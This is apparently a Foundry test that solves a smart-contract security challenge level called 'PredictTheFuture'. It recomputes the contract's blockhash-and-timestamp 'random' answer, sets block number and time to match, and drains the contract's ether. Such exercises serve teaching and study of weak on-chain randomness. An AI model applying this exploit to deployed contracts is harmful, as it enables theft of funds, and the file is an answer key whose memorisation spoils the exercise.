// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/06_PredictTheFuture/PredictTheFuture.sol";

// forge test --match-contract PredictTheFutureTest -vvvv
contract PredictTheFutureTest is BaseTest {
    PredictTheFuture instance;

    function setUp() public override {
        super.setUp();
        instance = new PredictTheFuture{value: 0.01 ether}();

        vm.roll(143242);
    }

    function testExploitLevel() public {
        uint256 timestamp = 1000;
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(143242 - 1),
                    timestamp
                )
            )
        ) % 10;

        instance.setGuess{value: 0.01 ether}(uint8(answer));

        vm.warp(timestamp);
        vm.roll(143242 + 2);
        instance.solution();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
